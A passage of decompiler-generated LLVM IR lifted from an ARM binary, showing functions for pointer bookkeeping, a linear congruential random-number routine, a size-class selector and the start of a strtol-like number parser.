  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15fb0 = load i32, i32* @r4, align 4
  store i32 %v3_15fb0, i32* %stack_var_-8, align 4
  %v1_15fb4 = add i32 %tmp, 12
  %v2_15fb4 = inttoptr i32 %v1_15fb4 to i8*
  %v3_15fb4 = load i8, i8* %v2_15fb4, align 1
  %v4_15fb4 = sext i8 %v3_15fb4 to i32
  store i32 %v4_15fb4, i32* %r3.global-to-local, align 4
  %v2_15fb8 = icmp eq i8 %v3_15fb4, 0
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_15fc4 = add i32 %tmp, 8
  %v2_15fc4 = inttoptr i32 %v1_15fc4 to i32*
  %v3_15fc4 = load i32, i32* %v2_15fc4, align 4
  store i32 %v3_15fc4, i32* %lr.global-to-local, align 4
  br i1 %v2_15fb8, label %dec_label_pc_15fcc, label %dec_label_pc_15ff0

dec_label_pc_15fcc:                               ; preds = %dec_label_pc_15fb0
  %v1_15fcc = inttoptr i32 %v3_15fc4 to i32*
  %v2_15fcc = load i32, i32* %v1_15fcc, align 4
  store i32 %v2_15fcc, i32* %r2.global-to-local, align 4
  %v2_15fd4 = mul i32 %v2_15fcc, 1103515245
  %v1_15fdc = add i32 %v2_15fd4, 12345
  %tmp6 = bitcast i32 %v1_15fdc to float
  %tmp7 = call float @fabsf(float %tmp6)
  %v1_15fe0 = bitcast float %tmp7 to i32
  store i32 %v1_15fe0, i32* %r3.global-to-local, align 4
  store i32 %v1_15fe0, i32* %v1_15fcc, align 4
  %v0_15fe8 = load i32, i32* %r3.global-to-local, align 4
  %v2_15fe8 = inttoptr i32 %arg2 to i32*
  store i32 %v0_15fe8, i32* %v2_15fe8, align 4
  br label %dec_label_pc_16030

dec_label_pc_15ff0:                               ; preds = %dec_label_pc_15fb0
  %v2_15ff0 = load i32, i32* %arg1, align 4
  store i32 %v2_15ff0, i32* %r2.global-to-local, align 4
  %v1_15ff4 = add i32 %tmp, 4
  %v2_15ff4 = inttoptr i32 %v1_15ff4 to i32*
  %v3_15ff4 = load i32, i32* %v2_15ff4, align 4
  store i32 %v3_15ff4, i32* %r0.global-to-local, align 4
  %v1_15ff8 = inttoptr i32 %v2_15ff0 to i32*
  %v2_15ff8 = load i32, i32* %v1_15ff8, align 4
  store i32 %v2_15ff8, i32* %r1.global-to-local, align 4
  %v1_15ffc = inttoptr i32 %v3_15ff4 to i32*
  %v2_15ffc = load i32, i32* %v1_15ffc, align 4
  %v4_15ffc = add i32 %v3_15ff4, 4
  store i32 %v4_15ffc, i32* %r0.global-to-local, align 4
  %v2_16000 = add i32 %v2_15ffc, %v2_15ff8
  store i32 %v2_16000, i32* %r3.global-to-local, align 4
  store i32 %v2_16000, i32* %v1_15ff8, align 4
  %v3_16004 = load i32, i32* %r2.global-to-local, align 4
  %v4_16004 = add i32 %v3_16004, 4
  store i32 %v4_16004, i32* %r2.global-to-local, align 4
  %v0_16008 = load i32, i32* %ip.global-to-local, align 4
  %v1_16008 = add i32 %v0_16008, 16
  %v2_16008 = inttoptr i32 %v1_16008 to i32*
  %v3_16008 = load i32, i32* %v2_16008, align 4
  store i32 %v3_16008, i32* %r1.global-to-local, align 4
  %v0_1600c = load i32, i32* %r3.global-to-local, align 4
  %v3_1600c = udiv i32 %v0_1600c, 2
  store i32 %v3_1600c, i32* %r3.global-to-local, align 4
  %v3_16010 = icmp ult i32 %v4_16004, %v3_16008
  %v1_16014 = load i32, i32* %r4.global-to-local, align 4
  %v2_16014 = inttoptr i32 %v1_16014 to i32*
  store i32 %v3_1600c, i32* %v2_16014, align 4
  br i1 %v3_16010, label %dec_label_pc_16020, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_15ff0
  %v1_16018 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_16018, i32* %r2.global-to-local, align 4
  %v0_16028.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_16020:                               ; preds = %dec_label_pc_15ff0
  %v0_16020 = load i32, i32* %r0.global-to-local, align 4
  %v1_16020 = load i32, i32* %r1.global-to-local, align 4
  %v3_16020 = icmp ult i32 %v0_16020, %v1_16020
  br i1 %v3_16020, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_16020
  %v1_16024 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_16024, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_16020, %._crit_edge, %bb
  %v0_16028 = phi i32 [ %v0_16028.pre, %._crit_edge ], [ %v0_16020, %dec_label_pc_16020 ], [ %v1_16024, %bb ]
  %v1_16028 = load i32, i32* %ip.global-to-local, align 4
  %v2_16028 = add i32 %v1_16028, 4
  %v3_16028 = inttoptr i32 %v2_16028 to i32*
  store i32 %v0_16028, i32* %v3_16028, align 4
  %v0_1602c = load i32, i32* %r2.global-to-local, align 4
  %v1_1602c = load i32, i32* %ip.global-to-local, align 4
  %v2_1602c = inttoptr i32 %v1_1602c to i32*
  store i32 %v0_1602c, i32* %v2_1602c, align 4
  br label %dec_label_pc_16030

dec_label_pc_16030:                               ; preds = %dec_label_pc_15fcc, %bb5
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_16034 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16034, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_1600c, { 1, 0 }
  uselistorder i32 %v1_15fe0, { 1, 0 }
  uselistorder i32 %tmp, { 3, 1, 0, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_16030, { 1, 0 }
  uselistorder label %bb5, { 2, 0, 1 }
}

define i32 @function_16040(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16040:
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_16040 = load i32, i32* @r4, align 4
  store i32 %v3_16040, i32* %stack_var_-36, align 4
  %v12_16040 = load i32, i32* @r7, align 4
  %v1_16044 = add i32 %tmp, 12
  %v2_16044 = inttoptr i32 %v1_16044 to i8*
  %v3_16044 = load i8, i8* %v2_16044, align 1
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_16054 = load i8, i8* %v2_16044, align 1
  %tmp24 = icmp ugt i8 %v3_16044, 4
  br i1 %tmp24, label %.dec_label_pc_16100_crit_edge, label %dec_label_pc_16060

.dec_label_pc_16100_crit_edge:                    ; preds = %dec_label_pc_16040
  br label %dec_label_pc_16100

dec_label_pc_16060:                               ; preds = %dec_label_pc_16040
  %v0_16060 = load i32, i32* @r0, align 4
  %v2_16060 = icmp eq i32 %v0_16060, 0
  %v1_16064 = add i32 %tmp, 8
  %v2_16064 = inttoptr i32 %v1_16064 to i32*
  %v3_16064 = load i32, i32* %v2_16064, align 4
  store i32 %v3_16064, i32* %r6.global-to-local, align 4
  br i1 %v2_16060, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_16060
  store i32 1, i32* @r0, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_16060, %bb
  %v0_16070 = phi i32 [ %v0_16060, %dec_label_pc_16060 ], [ 1, %bb ]
  %v2_1606c = icmp eq i8 %v3_16054, 0
  %v2_16070 = inttoptr i32 %v3_16064 to i32*
  store i32 %v0_16070, i32* %v2_16070, align 4
  br i1 %v2_1606c, label %dec_label_pc_160fc, label %dec_label_pc_16078

dec_label_pc_16078:                               ; preds = %bb21
  %v1_16078 = add i32 %tmp, 13
  %v2_16078 = inttoptr i32 %v1_16078 to i8*
  %v3_16078 = load i8, i8* %v2_16078, align 1
  %v4_16078 = sext i8 %v3_16078 to i32
  store i32 %v4_16078, i32* %sl.global-to-local, align 4
  store i32 16807, i32* %fp.global-to-local, align 4
  store i32 2836, i32* %sb.global-to-local, align 4
  %v0_16084 = load i32, i32* @r0, align 4
  store i32 %v0_16084, i32* @r4, align 4
  %v0_16088 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_16088, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_160b8

dec_label_pc_16094:                               ; preds = %dec_label_pc_160b8
  %v3_16094 = call i32 @function_1d400(i32 %v0_160bc, i32 ptrtoint ([72 x i8]* @global_var_1f31d.847 to i32))
  %v0_16098 = load i32, i32* @r4, align 4
  store i32 %v0_16098, i32* @r0, align 4
  %v2_1609c = load i32, i32* %fp.global-to-local, align 4
  %v3_1609c = mul i32 %v2_1609c, ptrtoint ([72 x i8]* @global_var_1f31d.847 to i32)
  store i32 %v3_1609c, i32* @r4, align 4
  store i32 ptrtoint ([72 x i8]* @global_var_1f31d.847 to i32), i32* @r1, align 4
  %v0_160a4 = call i32 @function_1d2d4()
  %v1_160a8 = load i32, i32* %sb.global-to-local, align 4
  %v2_160a8 = mul i32 %v1_160a8, %v0_160a4
  %v0_160ac = load i32, i32* @r4, align 4
  %v2_160ac = sub i32 %v0_160ac, %v2_160a8
  %v8_160ac = icmp slt i32 %v2_160ac, 0
  br i1 %v8_160ac, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_16094
  %v2_160b0 = add i32 %v2_160ac, 2147483647
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_16094, %bb22
  %storemerge = phi i32 [ %v2_160b0, %bb22 ], [ %v2_160ac, %dec_label_pc_16094 ]
  %v0_160b4 = phi i32 [ %v2_160b0, %bb22 ], [ %v2_160ac, %dec_label_pc_16094 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_160b4 = load i32, i32* %r8.global-to-local, align 4
  %v2_160b4 = add i32 %v1_160b4, 4
  %v3_160b4 = inttoptr i32 %v2_160b4 to i32*
  store i32 %v0_160b4, i32* %v3_160b4, align 4
  %v4_160b4 = load i32, i32* %r8.global-to-local, align 4
  %v5_160b4 = add i32 %v4_160b4, 4
  store i32 %v5_160b4, i32* %r8.global-to-local, align 4
  %v0_160b8.pre = load i32, i32* @r7, align 4
  %v1_160b8.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_160bc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_160b8

dec_label_pc_160b8:                               ; preds = %dec_label_pc_16078, %bb23
  %v0_160bc = phi i32 [ %v0_16084, %dec_label_pc_16078 ], [ %v0_160bc.pre, %bb23 ]
  %v0_160d0 = phi i32 [ %v4_16078, %dec_label_pc_16078 ], [ %v1_160b8.pre, %bb23 ]
  %v0_160c4 = phi i32 [ 1, %dec_label_pc_16078 ], [ %v0_160b8.pre, %bb23 ]
  %v1_160c4 = add i32 %v0_160c4, 1
  store i32 %v1_160c4, i32* @r7, align 4
  %v5_160c8 = icmp slt i32 %v0_160c4, %v0_160d0
  br i1 %v5_160c8, label %dec_label_pc_16094, label %dec_label_pc_160cc

dec_label_pc_160cc:                               ; preds = %dec_label_pc_160b8
  %v2_160d0 = mul i32 %v0_160d0, 10
  store i32 %v2_160d0, i32* @r4, align 4
  %v0_160d4 = load i32, i32* %r5.global-to-local, align 4
  %v1_160d4 = add i32 %v0_160d4, 14
  %v2_160d4 = inttoptr i32 %v1_160d4 to i8*
  %v3_160d4 = load i8, i8* %v2_160d4, align 1
  %v4_160d4 = sext i8 %v3_160d4 to i32
  %v2_160d8 = ptrtoint i32* %stack_var_-44 to i32
  %v0_160dc = load i32, i32* %r6.global-to-local, align 4
  %v4_160dc = mul nsw i32 %v4_160d4, 4
  %v5_160dc = add i32 %v0_160dc, %v4_160dc
  %v1_160e0 = inttoptr i32 %v0_160d4 to i32*
  store i32 %v5_160dc, i32* %v1_160e0, align 4
  %v3_160e0 = add i32 %v0_160d4, 4
  %v4_160e0 = inttoptr i32 %v3_160e0 to i32*
  %v5_160e0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v5_160e0, i32* %v4_160e0, align 4
  br label %dec_label_pc_160ec

dec_label_pc_160e8:                               ; preds = %dec_label_pc_160ec
  %v0_160f0 = load i32, i32* %r5.global-to-local, align 4
  %v2_160e8 = inttoptr i32 %v0_160f0 to i32*
  %v3_160e8 = call i32 @function_15fb0(i32* %v2_160e8, i32 %v2_160d8)
  br label %dec_label_pc_160ec

dec_label_pc_160ec:                               ; preds = %dec_label_pc_160cc, %dec_label_pc_160e8
  %v0_160ec = load i32, i32* @r4, align 4
  %v1_160ec = add i32 %v0_160ec, -1
  store i32 %v1_160ec, i32* @r4, align 4
  %v6_160ec = icmp slt i32 %v1_160ec, 0
  br i1 %v6_160ec, label %dec_label_pc_160fc, label %dec_label_pc_160e8

dec_label_pc_160fc:                               ; preds = %dec_label_pc_160ec, %bb21
  %v2_16104.pre = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_16100

dec_label_pc_16100:                               ; preds = %.dec_label_pc_16100_crit_edge, %dec_label_pc_160fc
  %v2_16104 = phi i32 [ %v3_16040, %.dec_label_pc_16100_crit_edge ], [ %v2_16104.pre, %dec_label_pc_160fc ]
  %v1_16108 = phi i32 [ -1, %.dec_label_pc_16100_crit_edge ], [ 0, %dec_label_pc_160fc ]
  store i32 %v2_16104, i32* @r4, align 4
  store i32 %v12_16040, i32* @r7, align 4
  ret i32 %v1_16108

; uselistorder directives
  uselistorder i32 %v1_160ec, { 1, 0 }
  uselistorder i32 %v0_160d4, { 1, 0, 2 }
  uselistorder i32 %v0_160c4, { 1, 0 }
  uselistorder i32 %tmp, { 2, 0, 3, 1 }
  uselistorder i32 ptrtoint ([72 x i8]* @global_var_1f31d.847 to i32), { 2, 1, 0 }
  uselistorder label %dec_label_pc_16100, { 1, 0 }
  uselistorder label %dec_label_pc_160ec, { 1, 0 }
  uselistorder label %dec_label_pc_160b8, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @function_1610c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1610c:
  %v0_1610c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1610c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1610c
  %v2_1610c = load i32, i32* @r7, align 4
  %v5_1610c = udiv i32 %v2_1610c, 8
  %v6_1610c = and i32 %v5_1610c, %arg1
  %v3_16110 = load i32, i32* @fp, align 4
  %v8_16110 = shl i32 %v6_1610c, %v3_16110
  %v9_16110 = and i32 %v8_16110, %arg1
  %v2_16114 = load i32, i32* @sp, align 4
  %v8_16114 = shl i32 %v2_16114, %arg3
  %v9_16114 = and i32 %v8_16114, %arg2
  call void @__pseudo_branch(i32 %v9_16114)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1610c, %bb
  %v10_16114 = phi i32 [ %arg1, %dec_label_pc_1610c ], [ %v9_16110, %bb ]
  ret i32 %v10_16114

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_16118(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_16118:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v3_16118 = load i32, i32* @r4, align 4
  %v6_16118 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_16148, label %dec_label_pc_16138

dec_label_pc_16138:                               ; preds = %dec_label_pc_16118
  %v2_16138 = icmp ugt i32 %arg2, 254
  %v7_16138 = icmp eq i32 %arg2, 255
  %v2_1613c = xor i1 %v7_16138, true
  %v3_1613c = and i1 %v2_16138, %v2_1613c
  br i1 %v3_1613c, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_16138
  store i32 4, i32* @r4, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_16138, %bb
  %v1_161747 = phi i32 [ %v3_16118, %dec_label_pc_16138 ], [ 4, %bb ]
  %v2_16140 = xor i1 %v2_16138, true
  %v3_16140 = or i1 %v7_16138, %v2_16140
  br i1 %v3_16140, label %bb22, label %bb26

bb22:                                             ; preds = %bb21
  store i32 3, i32* @r4, align 4
  br label %bb26

dec_label_pc_16148:                               ; preds = %dec_label_pc_16118
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_16160, label %dec_label_pc_16150

dec_label_pc_16150:                               ; preds = %dec_label_pc_16148
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_161d0

.thread10:                                        ; preds = %dec_label_pc_16150
  store i32 0, i32* @r4, align 4
  br label %bb26

dec_label_pc_16160:                               ; preds = %dec_label_pc_16148
  %v2_16160 = icmp ugt i32 %arg2, 62
  %v7_16160 = icmp eq i32 %arg2, 63
  %v2_16164 = xor i1 %v7_16160, true
  %v3_16164 = and i1 %v2_16160, %v2_16164
  br i1 %v3_16164, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_16160
  store i32 2, i32* @r4, align 4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_16160, %bb23
  %v1_161746 = phi i32 [ %v3_16118, %dec_label_pc_16160 ], [ 2, %bb23 ]
  %v2_16168 = xor i1 %v2_16160, true
  %v3_16168 = or i1 %v7_16160, %v2_16168
  br i1 %v3_16168, label %bb25, label %bb26

bb25:                                             ; preds = %bb24
  store i32 1, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %.thread10, %bb22, %bb21, %bb24, %bb25
  %v1_16180 = phi i32 [ 3, %bb22 ], [ %v1_161747, %bb21 ], [ %v1_161746, %bb24 ], [ 1, %bb25 ], [ 0, %.thread10 ]
  store i32 ptrtoint (i32* @global_var_238bc.842 to i32), i32* %r3.global-to-local, align 4
  %v4_16174 = mul i32 %v1_16180, 4
  %v5_16174 = add i32 %v4_16174, ptrtoint (i32* @global_var_238bc.842 to i32)
  store i32 %v5_16174, i32* %r2.global-to-local, align 4
  %v1_16178 = add i32 %v4_16174, add (i32 ptrtoint (i32* @global_var_238bc.842 to i32), i32 20)
  %v2_16178 = inttoptr i32 %v1_16178 to i32*
  %v3_16178 = load i32, i32* %v2_16178, align 4
  store i32 %v3_16178, i32* %r1.global-to-local, align 4
  %v1_1617c = add i32 %tmp, 4
  store i32 %v1_1617c, i32* @r6, align 4
  %v6_16180 = inttoptr i32 %v5_16174 to i32*
  %v7_16180 = load i32, i32* %v6_16180, align 4
  store i32 %v7_16180, i32* %r2.global-to-local, align 4
  %v4_16184 = mul i32 %v3_16178, 4
  %v5_16184 = add i32 %v4_16184, %v1_1617c
  store i32 %v5_16184, i32* %r3.global-to-local, align 4
  %v2_16188 = add i32 %arg3, 16
  %v3_16188 = inttoptr i32 %v2_16188 to i32*
  store i32 %v5_16184, i32* %v3_16188, align 4
  %v0_1618c = load i32, i32* %r2.global-to-local, align 4
  %v1_1618c = trunc i32 %v0_1618c to i8
  %v2_1618c = load i32, i32* @r5, align 4
  %v3_1618c = add i32 %v2_1618c, 14
  %v4_1618c = inttoptr i32 %v3_1618c to i8*
  store i8 %v1_1618c, i8* %v4_1618c, align 1
  %v0_16190 = load i32, i32* %r1.global-to-local, align 4
  %v1_16190 = trunc i32 %v0_16190 to i8
  %v2_16190 = load i32, i32* @r5, align 4
  %v3_16190 = add i32 %v2_16190, 13
  %v4_16190 = inttoptr i32 %v3_16190 to i8*
  store i8 %v1_16190, i8* %v4_16190, align 1
  %v0_16194 = load i32, i32* @r4, align 4
  %v1_16194 = trunc i32 %v0_16194 to i8
  %v2_16194 = load i32, i32* @r5, align 4
  %v3_16194 = add i32 %v2_16194, 12
  %v4_16194 = inttoptr i32 %v3_16194 to i8*
  store i8 %v1_16194, i8* %v4_16194, align 1
  %v0_16198 = load i32, i32* @r6, align 4
  %v1_16198 = load i32, i32* @r5, align 4
  %v2_16198 = add i32 %v1_16198, 8
  %v3_16198 = inttoptr i32 %v2_16198 to i32*
  store i32 %v0_16198, i32* %v3_16198, align 4
  %v0_1619c = load i32, i32* @r5, align 4
  store i32 %v0_1619c, i32* %r1.global-to-local, align 4
  %v0_161a0 = load i32, i32* @r0, align 4
  %v2_161a0 = inttoptr i32 %v0_161a0 to i32*
  %v3_161a0 = call i32 @function_16040(i32* %v2_161a0, i32 %v0_1619c)
  store i32 %v3_161a0, i32* %r0.global-to-local, align 4
  %v0_161a4 = load i32, i32* @r4, align 4
  %v2_161a4 = icmp eq i32 %v0_161a4, 0
  br i1 %v2_161a4, label %bb27, label %.thread4

bb27:                                             ; preds = %bb26
  %v1_161c012 = load i32, i32* @r7, align 4
  %v2_161c013 = inttoptr i32 %v1_161c012 to i32*
  store i32 0, i32* %v2_161c013, align 4
  %v1_161c4 = load i32, i32* @r4, align 4
  store i32 %v1_161c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_161e8

.thread4:                                         ; preds = %bb26
  %v1_161a8 = load i32, i32* @r5, align 4
  %v2_161a8 = add i32 %v1_161a8, 4
  %v3_161a8 = inttoptr i32 %v2_161a8 to i32*
  %v4_161a8 = load i32, i32* %v3_161a8, align 4
  %v1_161ac = load i32, i32* @r6, align 4
  %v3_161ac = sub i32 %v4_161a8, %v1_161ac
  %v4_161b0 = sdiv i32 %v3_161ac, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_161b8 = mul i32 %v4_161b0, 5
  %v5_161b8 = add i32 %v4_161b8, %v0_161a4
  store i32 %v5_161b8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_161c0 = load i32, i32* @r7, align 4
  %v2_161c0 = inttoptr i32 %v1_161c0 to i32*
  store i32 0, i32* %v2_161c0, align 4
  %v1_161c8 = load i32, i32* %r3.global-to-local, align 4
  %v2_161c8 = load i32, i32* @r7, align 4
  %v3_161c8 = inttoptr i32 %v2_161c8 to i32*
  store i32 %v1_161c8, i32* %v3_161c8, align 4
  %v1_161f0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_161e8

dec_label_pc_161d0:                               ; preds = %dec_label_pc_16150
  %v0_161d0 = call i32 @function_12b24()
  store i32 %v0_161d0, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_161d8 = inttoptr i32 %v0_161d0 to i32*
  store i32 22, i32* %v2_161d8, align 4
  %v0_161dc = call i32 @function_12b24()
  %v0_161e0 = load i32, i32* %r4.global-to-local, align 4
  %v2_161e0 = inttoptr i32 %v0_161dc to i32*
  store i32 %v0_161e0, i32* %v2_161e0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_161e8

dec_label_pc_161e8:                               ; preds = %bb27, %.thread4, %dec_label_pc_161d0
  %v1_161f0 = phi i32 [ %v1_161f0.pre, %.thread4 ], [ %v1_161c4, %bb27 ], [ -1, %dec_label_pc_161d0 ]
  store i32 %v3_16118, i32* @r4, align 4
  store i32 %v6_16118, i32* @r5, align 4
  ret i32 %v1_161f0

; uselistorder directives
  uselistorder i1 %v7_16160, { 1, 0 }
  uselistorder i1 %v7_16138, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_238bc.842 to i32), { 1, 0, 2 }
  uselistorder i32 %arg2, { 5, 6, 0, 1, 4, 3, 2, 7 }
  uselistorder label %dec_label_pc_161e8, { 2, 1, 0 }
  uselistorder label %bb26, { 4, 3, 0, 1, 2 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @function_161fc(i32 %arg1) local_unnamed_addr {
dec_label_pc_161fc:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_1620c = call i32 @function_1621c()
  ret i32 %v0_1620c
}

define i32 @function_1621c() local_unnamed_addr {
dec_label_pc_1621c:
  store i32 1, i32* @r3, align 4
  %v0_16228 = call i32 @function_16238()
  ret i32 %v0_16228
}

define i32 @function_16238() local_unnamed_addr {
dec_label_pc_16238:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v3_16238 = load i32, i32* @r4, align 4
  %v12_16238 = load i32, i32* @r7, align 4
  store i32 1524, i32* @lr, align 4
  %v0_1624c = load i32, i32* @r1, align 4
  store i32 %v0_1624c, i32* %fp.global-to-local, align 4
  %v0_16250 = load i32, i32* @r2, align 4
  store i32 %v0_16250, i32* %r5.global-to-local, align 4
  %v0_16254 = load i32, i32* @r0, align 4
  store i32 %v0_16254, i32* @r4, align 4
  %v0_16258 = load i32, i32* @r3, align 4
  br label %dec_label_pc_16264

dec_label_pc_16260:                               ; preds = %dec_label_pc_16264
  %v1_16260 = add i32 %v0_1629c, 1
  store i32 %v1_16260, i32* @r4, align 4
  br label %dec_label_pc_16264

dec_label_pc_16264:                               ; preds = %dec_label_pc_16238, %dec_label_pc_16260
  %v0_1629c = phi i32 [ %v0_16254, %dec_label_pc_16238 ], [ %v1_16260, %dec_label_pc_16260 ]
  %v1_16264 = inttoptr i32 %v0_1629c to i8*
  %v2_16264 = load i8, i8* %v1_16264, align 1
  %v3_16264 = zext i8 %v2_16264 to i32
  %v4_16268 = load i32, i32* inttoptr (i32 181784 to i32*), align 8
  %v2_1626c = mul nuw nsw i32 %v3_16264, 2
  %v2_16270 = add i32 %v2_1626c, %v4_16268
  %v3_16270 = inttoptr i32 %v2_16270 to i16*
  %v4_16270 = load i16, i16* %v3_16270, align 2
  %v1_16274 = and i16 %v4_16270, 32
  %v2_16274 = icmp eq i16 %v1_16274, 0
  br i1 %v2_16274, label %dec_label_pc_1627c, label %dec_label_pc_16260

dec_label_pc_1627c:                               ; preds = %dec_label_pc_16264
  %v7_1627c = icmp eq i8 %v2_16264, 43
  br i1 %v7_1627c, label %dec_label_pc_1629c, label %dec_label_pc_16284

dec_label_pc_16284:                               ; preds = %dec_label_pc_1627c
  %v7_16284 = icmp eq i8 %v2_16264, 45
  br i1 %v7_16284, label %dec_label_pc_1629c, label %bb

bb:                                               ; preds = %dec_label_pc_16284
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_162a0

dec_label_pc_1629c:                               ; preds = %dec_label_pc_1627c, %dec_label_pc_16284
  %storemerge39 = phi i32 [ 1, %dec_label_pc_16284 ], [ 0, %dec_label_pc_1627c ]
  store i32 %storemerge39, i32* @r7, align 4
  %v1_1629c = add i32 %v0_1629c, 1
  store i32 %v1_1629c, i32* @r4, align 4
  br label %dec_label_pc_162a0

dec_label_pc_162a0:                               ; preds = %bb, %dec_label_pc_1629c
  %v0_162c0 = phi i32 [ %v0_1629c, %bb ], [ %v1_1629c, %dec_label_pc_1629c ]
  %v1_162a0 = and i32 %v0_16250, -17
  %v3_162a0 = icmp eq i32 %v1_162a0, 0
  br i1 %v3_162a0, label %dec_label_pc_162ac, label %bb52

bb52:                                             ; preds = %dec_label_pc_162a0
  store i32 %v0_16254, i32* %r6.global-to-local, align 4
  br label %bb56

dec_label_pc_162ac:                               ; preds = %dec_label_pc_162a0
  %v1_162ac = inttoptr i32 %v0_162c0 to i8*
  %v2_162ac = load i8, i8* %v1_162ac, align 1
  %v7_162b0 = icmp eq i8 %v2_162ac, 48
  %v1_162b4 = add i32 %v0_16250, 10
  store i32 %v1_162b4, i32* %r5.global-to-local, align 4
  br i1 %v7_162b0, label %dec_label_pc_162c0, label %bb53

bb53:                                             ; preds = %dec_label_pc_162ac
  store i32 %v0_16254, i32* %r6.global-to-local, align 4
  br label %.thread8

dec_label_pc_162c0:                               ; preds = %dec_label_pc_162ac
  %v1_162c0 = add i32 %v0_162c0, 1
  %v2_162c0 = inttoptr i32 %v1_162c0 to i8*
  %v3_162c0 = load i8, i8* %v2_162c0, align 1
  %v4_162c0 = zext i8 %v3_162c0 to i32
  store i32 %v1_162c0, i32* @r4, align 4
  %v1_162c4 = or i32 %v4_162c0, 32
  %v7_162c8 = icmp eq i32 %v1_162c4, 120
  %v1_162cc = add i32 %v0_16250, 8
  store i32 %v1_162cc, i32* %r5.global-to-local, align 4
  store i32 %v1_162c0, i32* %r6.global-to-local, align 4
  br i1 %v7_162c8, label %bb54, label %.thread8

